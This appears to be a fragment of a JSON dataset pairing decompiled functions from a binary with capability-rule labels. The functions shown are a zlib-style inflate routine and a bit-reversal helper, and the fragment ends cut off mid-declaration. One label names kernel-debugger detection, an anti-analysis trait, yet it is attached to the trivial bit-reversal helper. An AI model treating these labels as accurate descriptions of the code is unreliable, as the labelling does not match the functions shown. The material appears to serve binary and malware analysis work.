        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00470aec(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    ushort uVar6;\n    uint8_t **in_EAX;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint8_t *arg_ch;\n    uint8_t *puVar14;\n    uint8_t *puStack48;\n    uint32_t uStack44;\n    uint8_t *puStack36;\n    uint8_t *puStack32;\n    uint uStack28;\n    char cStack24;\n    uint8_t uStack23;\n    int32_t iStack20;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == NULL)) || (in_EAX[3] == NULL)) || ((*in_EAX == NULL && (in_EAX[1] != NULL)))\n       ) {\n        return -2;\n    }\n    piVar2 = in_EAX[7];\n    if (*piVar2 == 3) {\n        *piVar2 = 4;\n    }\n    puVar9 = in_EAX[3];\n    puStack48 = in_EAX[4];\n    puVar3 = in_EAX[1];\n    uStack44 = piVar2[0xd];\n    arg_ch = *in_EAX;\n    uVar13 = piVar2[0xe];\n    iStack20 = 0;\n    puVar14 = puVar3;\n    puStack36 = puStack48;\n    do {\n    // switch table (21 cases) at 0x470b8b\n        switch(*piVar2) {\n        case 0:\n            if (piVar2[2] == 0) {\n                *piVar2 = 4;\n            }\n            else {\n                for (; uVar13 < 0x10; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00471892;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                if (((uStack44 & 0xff) * 0x100 + (uStack44 >> 8)) % 0x1f == 0) {\n                    if ((uStack44 & 0xf) == 8) {\n                        uStack44 = uStack44 >> 4;\n                        uVar13 = uVar13 - 4;\n                        uVar12 = (uStack44 & 0xf) + 8;\n                        if (uVar12 < piVar2[8] || uVar12 == piVar2[8]) {\n                            piVar2[5] = 1 << uVar12;\n                            puVar7 = fcn.0046e8d8();\n                            piVar2[6] = puVar7;\n                            in_EAX[0xc] = puVar7;\n                            if ((uStack44 & 0x200) == 0) {\n                                iVar8 = 3;\n                            }\n                            else {\n                                iVar8 = 1;\n                            }\n                            *piVar2 = iVar8;\n                            uVar13 = 0;\n                            uStack44 = 0;\n                        }\n                        else {\n                            in_EAX[6] = \"invalid window size\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"unknown compression method\";\n                        *piVar2 = 0x12;\n                    }\n                }\n                else {\n                    in_EAX[6] = \"incorrect header check\";\n                    *piVar2 = 0x12;\n                }\n            }\n            break;\n        case 1:\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00471892;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            puVar7 = (uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000;\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            uVar13 = 0;\n            uStack44 = 0;\n            *piVar2 = 2;\n        case 2:\n            if (piVar2[3] == 0) {\n                in_EAX[3] = puVar9;\n                in_EAX[4] = puStack48;\n                *in_EAX = arg_ch;\n                in_EAX[1] = puVar14;\n                piVar2[0xd] = uStack44;\n                piVar2[0xe] = uVar13;\n                return 2;\n            }\n            puVar7 = fcn.0046e8d8();\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            *piVar2 = 3;\ncode_r0x00470d9d:\n            if (param_2 == 5) goto code_r0x00471892;\ncode_r0x00470da8:\n            if (piVar2[1] == 0) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00471892;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                piVar2[1] = uStack44 & 1;\n                uVar12 = uStack44 >> 1 & 3;\n                if (uVar12 == 0) {\n                    *piVar2 = 5;\n                }\n                else if (uVar12 == 1) {\n                    fcn.004709c8();\n                    *piVar2 = 10;\n                }\n                else if (uVar12 == 2) {\n                    *piVar2 = 7;\n                }\n                else if (uVar12 == 3) {\n                    in_EAX[6] = \"invalid block type\";\n                    *piVar2 = 0x12;\n                }\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            else {\n                uStack44 = uStack44 >> (uVar13 & 7);\n                uVar13 = uVar13 - (uVar13 & 7);\n                *piVar2 = 0x10;\n            }\n            break;\n        case 3:\n            goto code_r0x00470d9d;\n        case 4:\n            goto code_r0x00470da8;\n        case 5:\n            uStack44 = uStack44 >> (uVar13 & 7);\n            for (uVar13 = uVar13 - (uVar13 & 7); uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00471892;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            if ((uStack44 & 0xffff) == (uStack44 >> 0x10 ^ 0xffff)) {\n                piVar2[0xf] = uStack44 & 0xffff;\n                uVar13 = 0;\n                uStack44 = 0;\n                *piVar2 = 6;\n                goto code_r0x00470ebf;\n            }\n            in_EAX[6] = \"invalid stored block lengths\";\n            *piVar2 = 0x12;\n            break;\n        case 6:\ncode_r0x00470ebf:\n            puStack32 = piVar2[0xf];\n            if (puStack32 == NULL) {\n                *piVar2 = 3;\n            }\n            else {\n                if (puVar14 < puStack32) {\n                    puStack32 = puVar14;\n                }\n                if (puStack48 < puStack32) {\n                    puStack32 = puStack48;\n                }\n                if (puStack32 == NULL) goto code_r0x00471892;\n                fcn.0046e62c(puVar9, arg_ch, puStack32);\n                puVar14 = puVar14 + -puStack32;\n                arg_ch = arg_ch + puStack32;\n                puStack48 = puStack48 + -puStack32;\n                puVar9 = puVar9 + puStack32;\n                piVar2[0xf] = piVar2[0xf] - puStack32;\n            }\n            break;\n        case 7:\n            for (; uVar13 < 0xe; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00471892;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            piVar2[0x17] = (uStack44 & 0x1f) + 0x101;\n            piVar2[0x18] = (uStack44 >> 5 & 0x1f) + 1;\n            piVar2[0x16] = (uStack44 >> 10 & 0xf) + 4;\n            uStack44 = uStack44 >> 0xe;\n            uVar13 = uVar13 - 0xe;\n            if ((piVar2[0x17] < 0x11f) && (piVar2[0x18] < 0x1f)) {\n                piVar2[0x19] = 0;\n                *piVar2 = 8;\n                goto code_r0x00471013;\n            }\n            in_EAX[6] = \"too many length or distance symbols\";\n            *piVar2 = 0x12;\n            break;\n        case 8:\ncode_r0x00471013:\n            while (piVar2[0x19] < piVar2[0x16]) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00471892;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4914fc) * 2 + 0x6c) = uStack44 & 7;\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            while (piVar2[0x19] < 0x13) {\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4914fc) * 2 + 0x6c) = 0;\n            }\n            piVar2[0x1a] = piVar2 + 0x14b;\n            piVar2[0x12] = piVar2 + 0x14b;\n            piVar2[0x14] = 7;\n            in_EAX = piVar2 + 0xbb;\n            iVar8 = fcn.00471d18(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n            if (iVar8 == 0) {\n                piVar2[0x19] = 0;\n                *piVar2 = 9;\ncode_r0x00471299:\n                while (piVar2[0x19] <= piVar2[0x17] + piVar2[0x18] && piVar2[0x17] + piVar2[0x18] != piVar2[0x19]) {\n                    while( true ) {\n                        uVar4 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4);\n                        uStack28._1_1_ = uVar4 >> 8;\n                        if (uStack28._1_1_ <= uVar13) break;\n                        if (puVar14 == NULL) goto code_r0x00471892;\n                        uVar1 = *arg_ch;\n                        arg_ch = arg_ch + 1;\n                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                        puVar14 = puVar14 + -1;\n                        uVar13 = uVar13 + 8;\n                    }\n                    uStack28._2_2_ = uVar4 >> 0x10;\n                    if (uStack28._2_2_ < 0x10) {\n                        for (; uVar13 < uStack28._1_1_; uVar13 = uVar13 + 8) {\n                            if (puVar14 == NULL) goto code_r0x00471892;\n                            uVar1 = *arg_ch;\n                            arg_ch = arg_ch + 1;\n                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                            puVar14 = puVar14 + -1;\n                        }\n                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                        uVar13 = uVar13 - uStack28._1_1_;\n                        iVar8 = piVar2[0x19];\n                        piVar2[0x19] = piVar2[0x19] + 1;\n                        *(piVar2 + iVar8 * 2 + 0x6c) = uStack28._2_2_;\n                    }\n                    else {\n                        if (uStack28._2_2_ == 0x10) {\n                            for (; uVar13 < uStack28._1_1_ + 2; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00471892;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar13 = uVar13 - uStack28._1_1_;\n                            if (piVar2[0x19] == 0) {\n                                in_EAX[6] = \"invalid bit length repeat\";\n                                *piVar2 = 0x12;\n                                break;\n                            }\n                            uVar6 = *(piVar2 + piVar2[0x19] * 2 + 0x6a);\n                            puStack32 = (uStack44 & 3) + 3;\n                            uStack44 = uStack44 >> 2;\n                            uVar13 = uVar13 - 2;\n                        }\n                        else if (uStack28._2_2_ == 0x11) {\n                            for (; uVar13 < uStack28._1_1_ + 3; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00471892;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 7) + 3;\n                            uStack44 = uStack44 >> 3;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 3;\n                        }\n                        else {\n                            for (; uVar13 < uStack28._1_1_ + 7; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00471892;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 0x7f) + 0xb;\n                            uStack44 = uStack44 >> 7;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 7;\n                        }\n                        if (piVar2[0x17] + piVar2[0x18] < piVar2[0x19] + puStack32) {\n                            in_EAX[6] = \"invalid bit length repeat\";\n                            *piVar2 = 0x12;\n                            break;\n                        }\n                        while (puStack32 != NULL) {\n                            iVar8 = piVar2[0x19];\n                            piVar2[0x19] = piVar2[0x19] + 1;\n                            *(piVar2 + iVar8 * 2 + 0x6c) = uVar6;\n                            puStack32 = puStack32 + -1;\n                        }\n                    }\n                }\n                if (*piVar2 != 0x12) {\n                    piVar2[0x1a] = piVar2 + 0x14b;\n                    piVar2[0x12] = piVar2 + 0x14b;\n                    piVar2[0x14] = 9;\n                    in_EAX = piVar2 + 0xbb;\n                    iVar8 = fcn.00471d18(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n                    if (iVar8 == 0) {\n                        piVar2[0x13] = piVar2[0x1a];\n                        piVar2[0x15] = 6;\n                        in_EAX = piVar2 + 0xbb;\n                        uStack44 = fcn.00471d18(in_EAX, piVar2 + 0x15, piVar2 + 0x1a);\n                        if (uStack44 == 0) {\n                            *piVar2 = 10;\ncode_r0x0047135c:\n                            if ((puVar14 < 0x6) || (puStack48 < 0x102)) {\n                                for (; uVar12 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4), \n                                    uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                    if (puVar14 == NULL) goto code_r0x00471892;\n                                    uVar1 = *arg_ch;\n                                    arg_ch = arg_ch + 1;\n                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                    puVar14 = puVar14 + -1;\n                                }\n                                uStack28._0_1_ = uVar12;\n                                uStack28 = uVar12;\n                                if ((uStack28 != '\\0') && ((uVar12 & 0xf0) == 0)) {\n                                    while( true ) {\n                                        uStack23 = uVar12 >> 8;\n                                        uStack28 = *(piVar2[0x12] +\n                                                    ((((1 << (uStack23 + uStack28 & 0x1f)) - 1U & uStack44) >>\n                                                     (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                        if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                        if (puVar14 == NULL) goto code_r0x00471892;\n                                        uVar1 = *arg_ch;\n                                        arg_ch = arg_ch + 1;\n                                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                        puVar14 = puVar14 + -1;\n                                        uVar13 = uVar13 + 8;\n                                    }\n                                    uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                    uVar13 = uVar13 - uStack23;\n                                }\n                                uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                uVar13 = uVar13 - uStack28._1_1_;\n                                piVar2[0xf] = uStack28 >> 0x10;\n                                if (uStack28 == '\\0') {\n                                    *piVar2 = 0xf;\n                                }\n                                else if ((uStack28 & 0x20) == 0) {\n                                    if ((uStack28 & 0x40) == 0) {\n                                        piVar2[0x11] = uStack28 & 0xf;\n                                        *piVar2 = 0xb;\ncode_r0x004714fc:\n                                        if (piVar2[0x11] != 0) {\n                                            for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                if (puVar14 == NULL) goto code_r0x00471892;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                            }\n                                            piVar2[0xf] = piVar2[0xf] + ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                            uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                            uVar13 = uVar13 - piVar2[0x11];\n                                        }\n                                        *piVar2 = 0xc;\ncode_r0x00471545:\n                                        for (; uVar12 = *(piVar2[0x13] +\n                                                         ((1 << (piVar2[0x15] & 0x1f)) - 1U & uStack44) * 4), \n                                            uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                            if (puVar14 == NULL) goto code_r0x00471892;\n                                            uVar1 = *arg_ch;\n                                            arg_ch = arg_ch + 1;\n                                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                            puVar14 = puVar14 + -1;\n                                        }\n                                        uStack28 = uVar12;\n                                        if ((uVar12 & 0xf0) == 0) {\n                                            while( true ) {\n                                                cStack24 = uVar12;\n                                                uStack23 = uVar12 >> 8;\n                                                uStack28 = *(piVar2[0x13] +\n                                                            ((((1 << (uStack23 + cStack24 & 0x1f)) - 1U & uStack44) >>\n                                                             (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                                if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                                if (puVar14 == NULL) goto code_r0x00471892;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                                uVar13 = uVar13 + 8;\n                                            }\n                                            uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                            uVar13 = uVar13 - uStack23;\n                                        }\n                                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                        uVar13 = uVar13 - uStack28._1_1_;\n                                        if ((uStack28 & 0x40) == 0) {\n                                            piVar2[0x10] = uStack28 >> 0x10;\n                                            piVar2[0x11] = uStack28 & 0xf;\n                                            *piVar2 = 0xd;\ncode_r0x00471648:\n                                            if (piVar2[0x11] != 0) {\n                                                for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                    if (puVar14 == NULL) goto code_r0x00471892;\n                                                    uVar1 = *arg_ch;\n                                                    arg_ch = arg_ch + 1;\n                                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                    puVar14 = puVar14 + -1;\n                                                }\n                                                piVar2[0x10] = piVar2[0x10] +\n                                                               ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                                uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                                uVar13 = uVar13 - piVar2[0x11];\n                                            }\n                                            if (puStack36 + (piVar2[10] - puStack48) < piVar2[0x10]) {\n                                                in_EAX[6] = \"invalid distance too far back\";\n                                                *piVar2 = 0x12;\n                                            }\n                                            else {\n                                                *piVar2 = 0xe;\ncode_r0x004716b6:\n                                                if (puStack48 == NULL) goto code_r0x00471892;\n                                                if (puStack36 - puStack48 < piVar2[0x10]) {\n                                                    puStack32 = piVar2[0x10] - (puStack36 - puStack48);\n                                                    puVar7 = piVar2[0xb];\n                                                    if (puVar7 < puStack32) {\n                                                        puStack32 = puStack32 + -puVar7;\n                                                        puVar7 = (piVar2[9] - puStack32) + piVar2[0xc];\n                                                    }\n                                                    else {\n                                                        puVar7 = puVar7 + (piVar2[0xc] - puStack32);\n                                                    }\n                                                    if (piVar2[0xf] < puStack32) {\n                                                        puStack32 = piVar2[0xf];\n                                                    }\n                                                }\n                                                else {\n                                                    puStack32 = piVar2[0xf];\n                                                    puVar7 = puVar9 + -piVar2[0x10];\n                                                }\n                                                if (puStack48 < puStack32) {\n                                                    puStack32 = puStack48;\n                                                }\n                                                puStack48 = puStack48 + -puStack32;\n                                                piVar2[0xf] = piVar2[0xf] - puStack32;\n                                                do {\n                                                    *puVar9 = *puVar7;\n                                                    puVar7 = puVar7 + 1;\n                                                    puVar9 = puVar9 + 1;\n                                                    puStack32 = puStack32 + -1;\n                                                } while (puStack32 != NULL);\n                                                if (piVar2[0xf] == 0) {\n                                                    *piVar2 = 10;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            in_EAX[6] = \"invalid distance code\";\n                                            *piVar2 = 0x12;\n                                        }\n                                    }\n                                    else {\n                                        in_EAX[6] = \"invalid literal/length code\";\n                                        *piVar2 = 0x12;\n                                    }\n                                }\n                                else {\n                                    *piVar2 = 3;\n                                }\n                            }\n                            else {\n                                in_EAX[3] = puVar9;\n                                in_EAX[4] = puStack48;\n                                *in_EAX = arg_ch;\n                                in_EAX[1] = puVar14;\n                                piVar2[0xd] = uStack44;\n                                piVar2[0xe] = uVar13;\n                                fcn.00470338();\n                                puVar9 = in_EAX[3];\n                                puStack48 = in_EAX[4];\n                                arg_ch = *in_EAX;\n                                puVar14 = in_EAX[1];\n                                uStack44 = piVar2[0xd];\n                                uVar13 = piVar2[0xe];\n                            }\n                        }\n                        else {\n                            in_EAX[6] = \"invalid distances set\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"invalid literal/lengths set\";\n                        *piVar2 = 0x12;\n                    }\n                }\n            }\n            else {\n                in_EAX[6] = \"invalid code lengths set\";\n                *piVar2 = 0x12;\n            }\n            break;\n        case 9:\n            goto code_r0x00471299;\n        case 10:\n            goto code_r0x0047135c;\n        case 0xb:\n            goto code_r0x004714fc;\n        case 0xc:\n            goto code_r0x00471545;\n        case 0xd:\n            goto code_r0x00471648;\n        case 0xe:\n            goto code_r0x004716b6;\n        case 0xf:\n            if (puStack48 == NULL) goto code_r0x00471892;\n            *puVar9 = *(piVar2 + 0xf);\n            puVar9 = puVar9 + 1;\n            puStack48 = puStack48 + -1;\n            *piVar2 = 10;\n            break;\n        case 0x10:\n            if (piVar2[2] == 0) {\ncode_r0x0047185f:\n                *piVar2 = 0x11;\n                goto code_r0x00471865;\n            }\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00471892;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            iVar8 = puStack36 - puStack48;\n            in_EAX[5] = in_EAX[5] + iVar8;\n            piVar2[7] = piVar2[7] + iVar8;\n            if (iVar8 != 0) {\n                puVar7 = fcn.0046e8d8();\n                piVar2[6] = puVar7;\n                in_EAX[0xc] = puVar7;\n            }\n            puStack36 = puStack48;\n            if ((uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000 ==\n                piVar2[6]) {\n                uVar13 = 0;\n                uStack44 = 0;\n                goto code_r0x0047185f;\n            }\n            in_EAX[6] = \"incorrect data check\";\n            *piVar2 = 0x12;\n            break;\n        case 0x11:\ncode_r0x00471865:\n            iStack20 = 1;\ncode_r0x00471892:\n            in_EAX[3] = puVar9;\n            in_EAX[4] = puStack48;\n            *in_EAX = arg_ch;\n            in_EAX[1] = puVar14;\n            piVar2[0xd] = uStack44;\n            piVar2[0xe] = uVar13;\n            if (((piVar2[9] != 0) || ((*piVar2 < 0x10 && (in_EAX[4] != puStack36)))) &&\n               (iVar8 = fcn.004709e8(),  iVar8 != 0)) {\n                *piVar2 = 0x13;\n                return -4;\n            }\n            iVar8 = puVar3 - in_EAX[1];\n            iVar5 = puStack36 - in_EAX[4];\n            in_EAX[2] = in_EAX[2] + iVar8;\n            in_EAX[5] = in_EAX[5] + iVar5;\n            piVar2[7] = piVar2[7] + iVar5;\n            if ((piVar2[2] != 0) && (iVar5 != 0)) {\n                puVar9 = fcn.0046e8d8();\n                piVar2[6] = puVar9;\n                in_EAX[0xc] = puVar9;\n            }\n            if (piVar2[1] == 0) {\n                iVar11 = 0;\n            }\n            else {\n                iVar11 = 0x40;\n            }\n            if (*piVar2 == 3) {\n                iVar10 = 0x80;\n            }\n            else {\n                iVar10 = 0;\n            }\n            in_EAX[0xb] = iVar11 + piVar2[0xe] + iVar10;\n            if (((iVar8 != 0) || (iVar5 != 0)) && (param_2 != 4)) {\n                return iStack20;\n            }\n            if (iStack20 != 0) {\n                return iStack20;\n            }\n            return -5;\n        case 0x12:\n            iStack20 = -3;\n            goto code_r0x00471892;\n        case 0x13:\n            return -4;\n        default:\n            return -2;\n        }\n    } while( true );\n}\n",
        "token_count": 7924
    },
    "00473e38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00473e38(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = in_EAX & 1;\n        in_EAX = in_EAX >> 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 160
    },
    "00474f94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2c8h\n// WARNING: Variable defined which should be unmapped: var_2c0h\n// WARNING: Variable defined which should be unmapped: var_2f8h\n// WARNING: Variable defined which should be unmapped: var_32ch\n// WARNING: Variable defined which should be unmapped: var_340h\n// WARNING: Variable defined which should be unmapped: var_354h\n// WARNING: Variable defined which should be unmapped: var_368h\n// WARNING: Variable defined which should be unmapped: var_3c8h\n// WARNING: Variable defined which should be unmapped: var_3ech\n// WARNING: Variable defined which should be unmapped: var_410h\n// WARNING: Variable defined which should be unmapped: var_434h\n// WARNING: Variable defined which should be unmapped: var_444h\n// WARNING: Variable defined which should be unmapped: var_464h\n// WARNING: Variable defined which should be unmapped: var_488h\n// WARNING: Variable defined which should be unmapped: var_548h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00474f94(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint *in_EAX;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t *unaff_EBX;\n    uint *unaff_ESI;\n    int32_t iVar10;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar11;\n    uchar *puVar12;\n    int32_t *piStack2356;\n    uchar *puVar13;\n    uchar *arg_8h;\n    int32_t var_7a8h;\n    code *pcStack1960;\n    uint *puStack1956;\n    uint *puStack1952;\n    uint *puStack1948;\n    uint uStack1944;\n    uint uStack1940;\n    uchar *puStack1936;\n    uint uStack1932;\n    uint uStack1928;\n    uint uStack1924;\n    int32_t *piStack1920;\n    int32_t iStack1916;\n    uchar *puStack1912;\n    uint uStack1908;\n    uint uStack1904;\n    uchar *puStack1900;\n    uchar *puStack1888;\n    uint uStack1884;\n    uint uStack1880;\n    uint uStack1876;\n    uint uStack1872;\n    uchar *puStack1868;\n    uint uStack1864;\n    uint uStack1860;\n    uint uStack1856;\n    uint uStack1852;\n    int32_t *piStack1848;\n    uchar *puStack1844;\n    uint *puStack1840;\n    int32_t *piStack1836;\n    uint uStack1832;\n    uint uStack1828;\n    uint uStack1824;\n    uchar *puStack1820;\n    uchar *puStack1816;\n    uint var_710h;\n    uint var_70ch;\n    uchar *puStack1804;\n    uint *puStack1736;\n    uint uStack1732;\n    int32_t iStack1720;\n    uint uStack1708;\n    uchar *puStack1704;\n    uchar *puStack1700;\n    uchar *puStack1696;\n    uint uStack1692;\n    uint uStack1688;\n    uint uStack1684;\n    code *pcStack1680;\n    int32_t iStack1676;\n    uint uStack1672;\n    uint *puStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    uint *puStack1656;\n    uchar *puStack1652;\n    uint uStack1648;\n    uint uStack1644;\n    uint *puStack1640;\n    uint uStack1636;\n    int32_t *piStack1632;\n    uint *puStack1628;\n    uchar *arg_8h_00;\n    uint uStack1600;\n    uint uStack1596;\n    uint uStack1592;\n    uint uStack1588;\n    uint uStack1584;\n    uchar *puStack1580;\n    uint uStack1576;\n    uint uStack1572;\n    uint uStack1568;\n    uint var_618h;\n    int32_t *piStack1560;\n    uint *puStack1556;\n    uint uStack1552;\n    uint uStack1548;\n    uint uStack1544;\n    int32_t *piStack1540;\n    int32_t *piStack1536;\n    uint *puStack1532;\n    uint uStack1528;\n    uint uStack1524;\n    uint uStack1520;\n    uint uStack1516;\n    uint uStack1512;\n    uchar *puStack1508;\n    uchar *puStack1504;\n    uchar *arg_8h_01;\n    uint *puStack1492;\n    uchar *arg_8h_02;\n    uint *puStack1484;\n    uint *puStack1464;\n    uint uStack1460;\n    uint var_5ach;\n    uint var_5a8h;\n    uint var_5a4h;\n    uint var_5a0h;\n    uint var_59ch;\n    uint *var_598h;\n    uint var_594h;\n    uint var_590h;\n    uint var_58ch;\n    code *var_588h;\n    uint var_584h;\n    uint var_580h;\n    uint *var_57ch;\n    uint var_578h;\n    int32_t *var_574h;\n    uint *var_570h;\n    uint *var_56ch;\n    code *var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint *var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint *var_550h;\n    uint *var_54ch;\n    int32_t *var_548h;\n    int32_t *var_544h;\n    uint var_540h;\n    int32_t *var_53ch;\n    uint var_538h;\n    int32_t *var_534h;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    int32_t *var_524h;\n    int32_t *var_520h;\n    uint var_51ch;\n    uint var_518h;\n    uint var_514h;\n    uint var_510h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_504h;\n    uint *var_500h;\n    int32_t *var_4fch;\n    int32_t *var_4f8h;\n    int32_t *var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    int32_t *var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint 